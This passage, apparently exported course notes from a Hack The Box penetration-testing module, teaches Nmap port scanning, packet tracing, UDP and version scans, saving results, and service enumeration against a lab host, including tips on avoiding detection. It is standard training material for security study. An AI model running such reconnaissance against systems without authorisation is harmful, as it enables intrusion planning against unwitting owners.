state of a port only occurs during the **TCP-ACK** scan and means that the port is accessible, but it cannot be determined whether it is open or closed.|\n|`open\\|filtered`|If we do not get a response for a specific port, `Nmap` will set it to that state. This indicates that a firewall or packet filter may protect the port.|\n|`closed\\|filtered`|This state only occurs in the **IP ID idle** scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.|\n\n---\n\n## Discovering Open TCP Ports\n\nBy default, `Nmap` scans the top 1000 TCP ports with the SYN scan (`-sS`). This SYN scan is set only to default when we run it as root because of the socket permissions required to create raw TCP packets. Otherwise, the TCP scan (`-sT`) is performed by default. This means that if we do not define ports and scanning methods, these parameters are set automatically. We can define the ports one by one (`-p 22,25,80,139,445`), by range (`-p 22-445`), by top ports (`--top-ports=10`) from the `Nmap` database that have been signed as most frequent, by scanning all ports (`-p-`) but also by defining a fast port scan, which contains top 100 ports (`-F`).\n\n#### Scanning Top 10 TCP Ports\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 --top-ports=10 \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:36 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.021s latency).\n\nPORT     STATE    SERVICE\n21/tcp   closed   ftp\n22/tcp   open     ssh\n23/tcp   closed   telnet\n25/tcp   open     smtp\n80/tcp   open     http\n110/tcp  open     pop3\n139/tcp  filtered netbios-ssn\n443/tcp  closed   https\n445/tcp  filtered microsoft-ds\n3389/tcp closed   ms-wbt-server\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 1.44 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`--top-ports=10`|Scans the specified top ports that have been defined as most frequent.|\n\n---\n\nWe see that we only scanned the top 10 TCP ports of our target, and `Nmap` displays their state accordingly. If we trace the packets `Nmap` sends, we will see the `RST` flag on `TCP port 21` that our target sends back to us. To have a clear view of the SYN scan, we disable the ICMP echo requests (`-Pn`), DNS resolution (`-n`), and ARP ping scan (`--disable-arp-ping`).\n\n#### Nmap - Trace the Packets\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:39 CEST\nSENT (0.0429s) TCP 10.10.14.2:63090 > 10.129.2.28:21 S ttl=56 id=57322 iplen=44  seq=1699105818 win=1024 <mss 1460>\nRCVD (0.0573s) TCP 10.129.2.28:21 > 10.10.14.2:63090 RA ttl=64 id=0 iplen=40  seq=0 win=0\nNmap scan report for 10.11.1.28\nHost is up (0.014s latency).\n\nPORT   STATE  SERVICE\n21/tcp closed ftp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.07 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 21`|Scans only the specified port.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n\n---\n\nWe can see from the SENT line that we (`10.10.14.2`) sent a TCP packet with the `SYN` flag (`S`) to our target (`10.129.2.28`). In the next RCVD line, we can see that the target responds with a TCP packet containing the `RST` and `ACK` flags (`RA`). `RST` and `ACK` flags are used to acknowledge receipt of the TCP packet (`ACK`) and to end the TCP session (`RST`).\n\n#### Request\n\n|**Message**|**Description**|\n|---|---|\n|`SENT (0.0429s)`|Indicates the SENT operation of Nmap, which sends a packet to the target.|\n|`TCP`|Shows the protocol that is being used to interact with the target port.|\n|`10.10.14.2:63090 >`|Represents our IPv4 address and the source port, which will be used by Nmap to send the packets.|\n|`10.129.2.28:21`|Shows the target IPv4 address and the target port.|\n|`S`|SYN flag of the sent TCP packet.|\n|`ttl=56 id=57322 iplen=44 seq=1699105818 win=1024 mss 1460`|Additional TCP Header parameters.|\n\n#### Response\n\n|**Message**|**Description**|\n|---|---|\n|`RCVD (0.0573s)`|Indicates a received packet from the target.|\n|`TCP`|Shows the protocol that is being used.|\n|`10.129.2.28:21 >`|Represents targets IPv4 address and the source port, which will be used to reply.|\n|`10.10.14.2:63090`|Shows our IPv4 address and the port that will be replied to.|\n|`RA`|RST and ACK flags of the sent TCP packet.|\n|`ttl=64 id=0 iplen=40 seq=0 win=0`|Additional TCP Header parameters.|\n\n#### Connect Scan\n\nThe Nmap [TCP Connect Scan](https://nmap.org/book/scan-methods-connect-scan.html) (`-sT`) uses the TCP three-way handshake to determine if a specific port on a target host is open or closed. The scan sends an `SYN` packet to the target port and waits for a response. It is considered open if the target port responds with an `SYN-ACK` packet and closed if it responds with an `RST` packet.\n\nThe `Connect` scan (also known as a full TCP connect scan) is highly accurate because it completes the three-way TCP handshake, allowing us to determine the exact state of a port (open, closed, or filtered). However, it is not the most stealthy. In fact, the Connect scan is one of the least stealthy techniques, as it fully establishes a connection, which creates logs on most systems and is easily detected by modern IDS/IPS solutions. That said, the Connect scan can still be useful in certain situations, particularly when accuracy is a priority, and the goal is to map the network without causing significant disruption to services. Since the scan fully establishes a TCP connection, it interacts cleanly with services, making it less likely to cause service errors or instability compared to more intrusive scans. While it is not the most stealthy method, it is sometimes considered a more \"polite\" scan because it behaves like a normal client connection, thus having minimal impact on the target services.\n\nIt is also useful when the target host has a personal firewall that drops incoming packets but allows outgoing packets. In this case, a Connect scan can bypass the firewall and accurately determine the state of the target ports. However, it is important to note that the Connect scan is slower than other types of scans because it requires the scanner to wait for a response from the target after each packet it sends, which could take some time if the target is busy or unresponsive.\n\nScans like the SYN scan (also known as a half-open scan) are generally considered more stealthy because they do not complete the full handshake, leaving the connection incomplete after sending the initial SYN packet. This minimizes the chance of triggering connection logs while still gathering port state information. Advanced IDS/IPS systems, however, have adapted to detect even these subtler techniques.\n\n#### Connect Scan on TCP Port 443\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:26 CET\nCONN (0.0385s) TCP localhost > 10.129.2.28:443 => Operation now in progress\nCONN (0.0396s) TCP localhost > 10.129.2.28:443 => Connected\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.013s latency).\n\nPORT    STATE SERVICE REASON\n443/tcp open  https   syn-ack\n\nNmap done: 1 IP address (1 host up) scanned in 0.04 seconds\n```\n\n---\n\n## Filtered Ports\n\nWhen a port is shown as filtered, it can have several reasons. In most cases, firewalls have certain rules set to handle specific connections. The packets can either be `dropped`, or `rejected`. When a packet gets dropped, `Nmap` receives no response from our target, and by default, the retry rate (`--max-retries`) is set to `10`. This means `Nmap` will resend the request to the target port to determine if the previous packet was accidentally mishandled or not.\n\nLet us look at an example where the firewall `drops` the TCP packets we send for the port scan. Therefore we scan the TCP port **139**, which was already shown as filtered. To be able to track how our sent packets are handled, we deactivate the ICMP echo requests (`-Pn`), DNS resolution (`-n`), and ARP ping scan (`--disable-arp-ping`) again.\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:45 CEST\nSENT (0.0381s) TCP 10.10.14.2:60277 > 10.129.2.28:139 S ttl=47 id=14523 iplen=44  seq=4175236769 win=1024 <mss 1460>\nSENT (1.0411s) TCP 10.10.14.2:60278 > 10.129.2.28:139 S ttl=45 id=7372 iplen=44  seq=4175171232 win=1024 <mss 1460>\nNmap scan report for 10.129.2.28\nHost is up.\n\nPORT    STATE    SERVICE\n139/tcp filtered netbios-ssn\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 139`|Scans only the specified port.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`-Pn`|Disables ICMP Echo requests.|\n\n---\n\nWe see in the last scan that `Nmap` sent two TCP packets with the SYN flag. By the duration (`2.06s`) of the scan, we can recognize that it took much longer than the previous ones (`~0.05s`). The case is different if the firewall rejects the packets. For this, we look at TCP port `445`, which is handled accordingly by such a rule of the firewall.\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p 445 --packet-trace -n --disable-arp-ping -Pn\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:55 CEST\nSENT (0.0388s) TCP 10.129.2.28:52472 > 10.129.2.28:445 S ttl=49 id=21763 iplen=44  seq=1418633433 win=1024 <mss 1460>\nRCVD (0.0487s) ICMP [10.129.2.28 > 10.129.2.28 Port 445 unreachable (type=3/code=3) ] IP [ttl=64 id=20998 iplen=72 ]\nNmap scan report for 10.129.2.28\nHost is up (0.0099s latency).\n\nPORT    STATE    SERVICE\n445/tcp filtered microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p 445`|Scans only the specified port.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`-Pn`|Disables ICMP Echo requests.|\n\nAs a response, we receive an `ICMP` reply with `type 3` and `error code 3`, which indicates that the desired port is unreachable. Nevertheless, if we know that the host is alive, we can strongly assume that the firewall on this port is rejecting the packets, and we will have to take a closer look at this port later.\n\n---\n\n## Discovering Open UDP Ports\n\nSome system administrators sometimes forget to filter the UDP ports in addition to the TCP ones. Since `UDP` is a `stateless protocol` and does not require a three-way handshake like TCP. We do not receive any acknowledgment. Consequently, the timeout is much longer, making the whole `UDP scan` (`-sU`) much slower than the `TCP scan` (`-sS`).\n\nLet's look at an example of what a UDP scan (`-sU`) can look like and what results it gives us.\n\n#### UDP Port Scan\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -F -sU\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:01 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.059s latency).\nNot shown: 95 closed ports\nPORT     STATE         SERVICE\n68/udp   open|filtered dhcpc\n137/udp  open          netbios-ns\n138/udp  open|filtered netbios-dgm\n631/udp  open|filtered ipp\n5353/udp open          zeroconf\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 98.07 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-F`|Scans top 100 ports.|\n|`-sU`|Performs a UDP scan.|\n\n---\n\nAnother disadvantage of this is that we often do not get a response back because `Nmap` sends empty datagrams to the scanned UDP ports, and we do not receive any response. So we cannot determine if the UDP packet has arrived at all or not. If the UDP port is `open`, we only get a response if the application is configured to do so.\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 137 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:15 CEST\nSENT (0.0367s) UDP 10.10.14.2:55478 > 10.129.2.28:137 ttl=57 id=9122 iplen=78\nRCVD (0.0398s) UDP 10.129.2.28:137 > 10.10.14.2:55478 ttl=64 id=13222 iplen=257\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.0031s latency).\n\nPORT    STATE SERVICE    REASON\n137/udp open  netbios-ns udp-response ttl 64\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.04 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-sU`|Performs a UDP scan.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`-p 137`|Scans only the specified port.|\n|`--reason`|Displays the reason a port is in a particular state.|\n\n---\n\nIf we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed `closed`.\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:25 CEST\nSENT (0.0445s) UDP 10.10.14.2:63825 > 10.129.2.28:100 ttl=57 id=29925 iplen=28\nRCVD (0.1498s) ICMP [10.129.2.28 > 10.10.14.2 Port unreachable (type=3/code=3) ] IP [ttl=64 id=11903 iplen=56 ]\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.11s latency).\n\nPORT    STATE  SERVICE REASON\n100/udp closed unknown port-unreach ttl 64\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in  0.15 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-sU`|Performs a UDP scan.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`-p 100`|Scans only the specified port.|\n|`--reason`|Displays the reason a port is in a particular state.|\n\n---\n\nFor all other ICMP responses, the scanned ports are marked as (`open|filtered`).\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 138 --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:32 CEST\nSENT (0.0380s) UDP 10.10.14.2:52341 > 10.129.2.28:138 ttl=50 id=65159 iplen=28\nSENT (1.0392s) UDP 10.10.14.2:52342 > 10.129.2.28:138 ttl=40 id=24444 iplen=28\nNmap scan report for 10.129.2.28\nHost is up, received user-set.\n\nPORT    STATE         SERVICE     REASON\n138/udp open|filtered netbios-dgm no-response\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 2.06 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-sU`|Performs a UDP scan.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`-p 138`|Scans only the specified port.|\n|`--reason`|Displays the reason a port is in a particular state.|\n\nAnother handy method for scanning ports is the `-sV` option which is used to get additional available information from the open ports. This method can identify versions, service names, and details about our target.\n\n#### Version Scan\n\nHost and Port Scanning\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason  -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-11-04 11:10 GMT\nSENT (0.3426s) TCP 10.10.14.2:44641 > 10.129.2.28:445 S ttl=55 id=43401 iplen=44  seq=3589068008 win=1024 <mss 1460>\nRCVD (0.3556s) TCP 10.129.2.28:445 > 10.10.14.2:44641 SA ttl=63 id=0 iplen=44  seq=2881527699 win=29200 <mss 1337>\nNSOCK INFO [0.4980s] nsock_iod_new2(): nsock_iod_new (IOD #1)\nNSOCK INFO [0.4980s] nsock_connect_tcp(): TCP connection requested to 10.129.2.28:445 (IOD #1) EID 8\nNSOCK INFO [0.5130s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.2.28:445]\nService scan sending probe NULL to 10.129.2.28:445 (tcp)\nNSOCK INFO [0.5130s] nsock_read(): Read request from IOD #1 [10.129.2.28:445] (timeout: 6000ms) EID 18\nNSOCK INFO [6.5190s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.2.28:445]\nService scan sending probe SMBProgNeg to 10.129.2.28:445 (tcp)\nNSOCK INFO [6.5190s] nsock_write(): Write request for 168 bytes to IOD #1 EID 27 [10.129.2.28:445]\nNSOCK INFO [6.5190s] nsock_read(): Read request from IOD #1 [10.129.2.28:445] (timeout: 5000ms) EID 34\nNSOCK INFO [6.5190s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.2.28:445]\nNSOCK INFO [6.5320s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.2.28:445] (135 bytes)\nService scan match (Probe SMBProgNeg matched with SMBProgNeg line 13836): 10.129.2.28:445 is netbios-ssn.  Version: |Samba smbd|3.X - 4.X|workgroup: WORKGROUP|\nNSOCK INFO [6.5320s] nsock_iod_delete(): nsock_iod_delete (IOD #1)\nNmap scan report for 10.129.2.28\nHost is up, received user-set (0.013s latency).\n\nPORT    STATE SERVICE     REASON         VERSION\n445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\nService Info: Host: Ubuntu\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.55 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-Pn`|Disables ICMP Echo requests.|\n|`-n`|Disables DNS resolution.|\n|`--disable-arp-ping`|Disables ARP ping.|\n|`--packet-trace`|Shows all packets sent and received.|\n|`-p 445`|Scans only the specified port.|\n|`--reason`|Displays the reason a port is in a particular state.|\n|`-sV`|Performs a service scan.|\n\nMore information about port scanning techniques we can find at: [https://nmap.org/book/man-port-scanning-techniques.html](https://nmap.org/book/man-port-scanning-techniques.html)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/06-Saving the Results",
    "path": "02_CPTS/02_Network Enumeration with Nmap/06-Saving the Results.md",
    "title": "06 Saving The Results",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Different Formats While we run various scans, we should always save the results. We can use these later to examine the differences between the different scanning methods we have used. Nmap can save th...",
    "category": "02_CPTS",
    "content": "## Different Formats\n\nWhile we run various scans, we should always save the results. We can use these later to examine the differences between the different scanning methods we have used. `Nmap` can save the results in 3 different formats.\n\n- Normal output (`-oN`) with the `.nmap` file extension\n- Grepable output (`-oG`) with the `.gnmap` file extension\n- XML output (`-oX`) with the `.xml` file extension\n\nWe can also specify the option (`-oA`) to save the results in all formats. The command could look like this:\n\nSaving the Results\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p- -oA target\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 12:14 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.0091s latency).\nNot shown: 65525 closed ports\nPORT      STATE SERVICE\n22/tcp    open  ssh\n25/tcp    open  smtp\n80/tcp    open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 10.22 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p-`|Scans all ports.|\n|`-oA target`|Saves the results in all formats, starting the name of each file with 'target'.|\n\nIf no full path is given, the results will be stored in the directory we are currently in. Next, we look at the different formats `Nmap` has created for us.\n\nSaving the Results\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls\n\ntarget.gnmap target.xml  target.nmap\n```\n\n#### Normal Output\n\nSaving the Results\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat target.nmap\n\n# Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28\nNmap scan report for 10.129.2.28\nHost is up (0.053s latency).\nNot shown: 4 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n25/tcp open  smtp\n80/tcp open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\n# Nmap done at Tue Jun 16 12:15:03 2020 -- 1 IP address (1 host up) scanned in 10.22 seconds\n```\n\n#### Grepable Output\n\nSaving the Results\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat target.gnmap\n\n# Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28\nHost: 10.129.2.28 ()\tStatus: Up\nHost: 10.129.2.28 ()\tPorts: 22/open/tcp//ssh///, 25/open/tcp//smtp///, 80/open/tcp//http///\tIgnored State: closed (4)\n# Nmap done at Tue Jun 16 12:14:53 2020 -- 1 IP address (1 host up) scanned in 10.22 seconds\n```\n\n#### XML Output\n\nSaving the Results\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat target.xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE nmaprun>\n<?xml-stylesheet href=\"file:///usr/local/bin/../share/nmap/nmap.xsl\" type=\"text/xsl\"?>\n<!-- Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28 -->\n<nmaprun scanner=\"nmap\" args=\"nmap -p- -oA target 10.129.2.28\" start=\"12145301719\" startstr=\"Tue Jun 16 12:15:03 2020\" version=\"7.80\" xmloutputversion=\"1.04\">\n<scaninfo type=\"syn\" protocol=\"tcp\" numservices=\"65535\" services=\"1-65535\"/>\n<verbose level=\"0\"/>\n<debugging level=\"0\"/>\n<host starttime=\"12145301719\" endtime=\"12150323493\"><status state=\"up\" reason=\"arp-response\" reason_ttl=\"0\"/>\n<address addr=\"10.129.2.28\" addrtype=\"ipv4\"/>\n<address addr=\"DE:AD:00:00:BE:EF\" addrtype=\"mac\" vendor=\"Intel Corporate\"/>\n<hostnames>\n</hostnames>\n<ports><extraports state=\"closed\" count=\"4\">\n<extrareasons reason=\"resets\" count=\"4\"/>\n</extraports>\n<port protocol=\"tcp\" portid=\"22\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/><service name=\"ssh\" method=\"table\" conf=\"3\"/></port>\n<port protocol=\"tcp\" portid=\"25\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/><service name=\"smtp\" method=\"table\" conf=\"3\"/></port>\n<port protocol=\"tcp\" portid=\"80\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/><service name=\"http\" method=\"table\" conf=\"3\"/></port>\n</ports>\n<times srtt=\"52614\" rttvar=\"75640\" to=\"355174\"/>\n</host>\n<runstats><finished time=\"12150323493\" timestr=\"Tue Jun 16 12:14:53 2020\" elapsed=\"10.22\" summary=\"Nmap done at Tue Jun 16 12:15:03 2020; 1 IP address (1 host up) scanned in 10.22 seconds\" exit=\"success\"/><hosts up=\"1\" down=\"0\" total=\"1\"/>\n</runstats>\n</nmaprun>\n```\n\n---\n\n## Style sheets\n\nWith the XML output, we can easily create HTML reports that are easy to read, even for non-technical people. This is later very useful for documentation, as it presents our results in a detailed and clear way. To convert the stored results from XML format to HTML, we can use the tool `xsltproc`.\n\nSaving the Results\n\n```shell-session\ndrxh3kr@htb[/htb]$ xsltproc target.xml -o target.html\n```\n\nIf we now open the HTML file in our browser, we see a clear and structured presentation of our results.\n\n#### Nmap Report\n\n![Nmap scan report for IP 10.10.10.28 shows open ports: 22 (SSH), 25 (SMTP), 80 (HTTP). Scanned on June 16, 2020.](https://academy.hackthebox.com/storage/modules/19/nmap-report.png)\n\nMore information about the output formats can be found at: [https://nmap.org/book/output.html](https://nmap.org/book/output.html)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/02_Network Enumeration with Nmap/07-Service Enumeration",
    "path": "02_CPTS/02_Network Enumeration with Nmap/07-Service Enumeration.md",
    "title": "07 Service Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- For us, it is essential to determine the application and its version as accurately as possible. We can use this information to scan for known vulnerabilities and analyze the source code for that v...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nFor us, it is essential to determine the application and its version as accurately as possible. We can use this information to scan for known vulnerabilities and analyze the source code for that version if we find it. An exact version number allows us to search for a more precise exploit that fits the service and the operating system of our target.\n\n---\n\n## Service Version Detection\n\nIt is recommended to perform a quick port scan first, which gives us a small overview of the available ports. This causes significantly less traffic, which is advantageous for us because otherwise we can be discovered and blocked by the security mechanisms. We can deal with these first and run a port scan in the background, which shows all open ports (`-p-`). We can use the version scan to scan the specific ports for services and their versions (`-sV`).\n\nA full port scan takes quite a long time. To view the scan status, we can press the `[Space Bar]` during the scan, which will cause `Nmap` to show us the scan status.\n\nService Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 19:44 CEST\n[Space Bar]\nStats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 3.64% done; ETC: 19:45 (0:00:53 remaining)\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p-`|Scans all ports.|\n|`-sV`|Performs service version detection on specified ports.|\n\n---\n\nAnother option (`--stats-every=5s`) that we can use is defining how periods of time the status should be shown. Here we can specify the number of seconds (`s`) or minutes (`m`), after which we want to get the status.\n\nService Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV --stats-every=5s\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 19:46 CEST\nStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 13.91% done; ETC: 19:49 (0:00:31 remaining)\nStats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 39.57% done; ETC: 19:48 (0:00:15 remaining)\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p-`|Scans all ports.|\n|`-sV`|Performs service version detection on specified ports.|\n|`--stats-every=5s`|Shows the progress of the scan every 5 seconds.|\n\n---\n\nWe can also increase the `verbosity level` (`-v` / `-vv`), which will show us the open ports directly when `Nmap` detects them.\n\nService Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV -v \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 20:03 CEST\nNSE: Loaded 45 scripts for scanning.\nInitiating ARP Ping Scan at 20:03\nScanning 10.129.2.28 [1 port]\nCompleted ARP Ping Scan at 20:03, 0.03s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 20:03\nCompleted Parallel DNS resolution of 1 host. at 20:03, 0.02s elapsed\nInitiating SYN Stealth Scan at 20:03\nScanning 10.129.2.28 [65535 ports]\nDiscovered open port 995/tcp on 10.129.2.28\nDiscovered open port 80/tcp on 10.129.2.28\nDiscovered open port 993/tcp on 10.129.2.28\nDiscovered open port 143/tcp on 10.129.2.28\nDiscovered open port 25/tcp on 10.129.2.28\nDiscovered open port 110/tcp on 10.129.2.28\nDiscovered open port 22/tcp on 10.129.2.28\n<SNIP>\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p-`|Scans all ports.|\n|`-sV`|Performs service version detection on specified ports.|\n|`-v`|Increases the verbosity of the scan, which displays more detailed information.|\n\n---\n\n## Banner Grabbing\n\nOnce the scan is complete, we will see all TCP ports with the corresponding service and their versions that are active on the system.\n\nService Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 20:00 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.013s latency).\nNot shown: 65525 closed ports\nPORT      STATE    SERVICE      VERSION\n22/tcp    open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n25/tcp    open     smtp         Postfix smtpd\n80/tcp    open     http         Apache httpd 2.4.29 ((Ubuntu))\n110/tcp   open     pop3         Dovecot pop3d\n139/tcp   filtered netbios-ssn\n143/tcp   open     imap         Dovecot imapd (Ubuntu)\n445/tcp   filtered microsoft-ds\n993/tcp   open     ssl/imap     Dovecot imapd (Ubuntu)\n995/tcp   open     ssl/pop3     Dovecot pop3d\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nService Info: Host:  inlane; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 91.73 seconds\n```\n\n|**Scanning Options**|**Description**|\n|---|---|\n|`10.129.2.28`|Scans the specified target.|\n|`-p-`|Scans all ports.|\n|`-sV`|Performs service version detection on specified ports.|\n\n---\n\nPrimarily, `Nmap` looks at the banners of the scanned ports and prints them out. If it cannot identify versions through the banners, `Nmap` attempts to identify them through a signature-based matching system, but this significantly increases the scan's duration. One disadvantage to `Nmap`'s presented results is that the automatic scan can miss some information because sometimes `Nmap` does not know how to handle it. Let us look at an example of this.\n\nService Enumeration\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org 